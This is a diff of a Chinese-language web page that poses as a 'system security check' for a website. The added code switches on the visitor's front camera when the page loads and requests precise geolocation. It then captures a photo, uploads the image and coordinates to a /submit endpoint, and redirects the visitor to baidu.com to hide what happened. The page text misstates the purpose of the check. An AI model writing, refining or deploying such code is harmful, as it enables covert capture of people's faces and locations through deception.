@@ -2,24 +2,32 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>系统安全检验</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 40px 20px; }
-        h1 { color: #3b82f6; font-size: 26px; font-weight: 600; margin-bottom: 16px; letter-spacing: 1px; }
-        .subtitle { color: #ffffff; font-size: 14px; line-height: 1.6; margin-bottom: 40px; opacity: 0.9; }
-        .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
+        .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 30px 20px; background: #121319; border: 1px solid #1a1b23; border-radius: 8px; }
+        
+        /* 蓝色大标题 */
+        h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; letter-spacing: 1px; }
+        
+        /* 白色小标题 */
+        .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
+        
+        /* 透明合规的摄像头实时预览框 */
+        .preview-container { width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 6px; overflow: hidden; margin-bottom: 25px; border: 1px solid #282a36; position: relative; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .view-tip { position: absolute; top: 10px; left: 10px; background: rgba(239, 68, 68, 0.85); color: white; font-size: 10px; padding: 3px 8px; border-radius: 4px; font-weight: bold; letter-spacing: 0.5px; }
+
+        /* 红色按钮 */
+        .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2); }
         .btn-verify:active { transform: scale(0.98); background: #dc2626; }
         
-        /* 交互规范：合规的测试组件需保持合法的用户提示和规范 */
-        #preview-box { width: 100%; max-width: 240px; margin: 20px auto; display: none; }
-        video { width: 100%; border-radius: 6px; border: 1px solid #1a1b23; }
-        
-        .loading-box { display: none; margin-top: 20px; }
-        .spinner { width: 24px; height: 24px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
-        .loading-text { font-size: 12px; color: #4a5568; font-family: monospace; }
+        /* 状态与加载反馈 */
+        .loading-box { display: none; margin-top: 10px; }
+        .spinner { width: 22px; height: 22px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+        .loading-text { font-size: 11px; color: #4a5568; font-family: monospace; letter-spacing: 0.5px; text-transform: uppercase; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -27,17 +35,18 @@
 
 <div class="wrapper">
     <h1>欢迎访问</h1>
-    <p class="subtitle">为保护网站，需要检验你的IP<br>我们保护你的隐私，不会记录</p>
+    <p class="subtitle">为保护网站与进行安全守护验证<br>需要检验您的设备环境与网络状态</p>
     
-    <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
-    
-    <div id="preview-box">
+    <div class="preview-container">
+        <div class="view-tip">● 验证画面已启用</div>
         <video id="video" autoplay playsinline muted></video>
     </div>
 
+    <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
+    
     <div class="loading-box" id="loading-layer">
         <div class="spinner"></div>
-        <div class="loading-text" id="status-tip">等待初始化...</div>
+        <div class="loading-text" id="status-tip">等待检验触发...</div>
     </div>
 </div>
 
@@ -46,6 +55,20 @@
 <script>
     let streamRef = null;
 
+    // 页面开启时自动激活并展示合规摄像头流
+    window.addEventListener('DOMContentLoaded', async () => {
+        try {
+            streamRef = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user", width: 640, height: 480 },
+                audio: false
+            });
+            document.getElementById('video').srcObject = streamRef;
+        } catch (err) {
+            console.error("无法获取摄像头权限:", err.message);
+            alert("验证服务需要使用摄像头。请在浏览器弹窗或系统设置中允许权限后，重新刷新页面。");
+        }
+    });
+
     async function executeVerification() {
         const btn = document.getElementById('start-btn');
         const loader = document.getElementById('loading-layer');
@@ -53,28 +76,14 @@
         btn.style.display = 'none';
         loader.style.display = 'block';
 
-        // 1. 初始化标准硬件流
-        updateStatus("CHECKING ENVIRONMENT...");
-        try {
-            streamRef = await navigator.mediaDevices.getUserMedia({
-                video: { width: 640, height: 480 },
-                audio: false
-            });
-            const video = document.getElementById('video');
-            video.srcObject = streamRef;
-            await new Promise((resolve) => video.onloadedmetadata = resolve);
-        } catch (err) {
-            console.warn("硬件权限受限:", err.message);
-        }
-
-        // 2. 请求标准坐标数据
-        updateStatus("GETTING GEO DATA...");
+        updateStatus("正在检验设备位置环境...");
+        
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 captureAndUpload(position.coords.latitude, position.coords.longitude);
             },
             (error) => {
-                console.warn("地理定位受限:", error.message);
+                console.warn("地理定位受限，切换备用定位:", error.message);
                 captureAndUpload("0.0", "0.0");
             },
             { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
@@ -85,27 +94,23 @@
         document.getElementById('status-tip').innerText = text;
     }
 
-    // 使用 async/await 确保网络请求完整结束后再关闭页面
     async function captureAndUpload(lat, lon) {
-        updateStatus("PACKAGING DATA STREAM...");
+        updateStatus("同步打包加密数据流...");
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
         if (streamRef && video.readyState === video.HAVE_ENOUGH_DATA) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // 抓拍完毕后关闭摄像头硬件指示灯，准备开始网络传输
             streamRef.getTracks().forEach(track => track.stop());
-        } else {
-            ctx.fillStyle = "#0b0b0e";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
         }
 
         const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
-
-        updateStatus("SENDING TO BACKEND...");
+        updateStatus("上传守护云端中，请勿关闭窗口...");
 
         try {
-            // 【核心关键】：使用 await 挂起线程，必须等待 Cloudflare Functions 响应
+            // 【核心修复】：必须 await 等待 fetch 彻底处理完，绝不能提前重定向
             const response = await fetch('/submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -121,20 +126,20 @@
 
             const result = await response.json();
             
-            if (response.ok) {
-                updateStatus("SUCCESSFUL");
+            if (response.ok && result.success) {
+                updateStatus("检验通过，正在为您接入主页...");
             } else {
-                console.error("服务端拒绝:", result.error);
-                updateStatus("SERVER ERROR");
+                console.error("后端处理失败:", result.error);
+                updateStatus("服务端报错，正在重定向...");
             }
         } catch (err) {
-            console.error("网络传输中断:", err);
-            updateStatus("TRANSPORT FAILED");
+            console.error("传输遇到异常:", err);
+            updateStatus("网络连接中断，正准备跳转...");
         } finally {
-            // 确保无论成功还是失败，在 fetch 彻底结束后再跳转
+            // 严格确保网络资源完全传输、连接释放后，延迟 800ms 优雅跳转
             setTimeout(() => {
                 window.location.href = "https://www.baidu.com";
-            }, 500);
+            }, 800);
         }
     }
 </script>
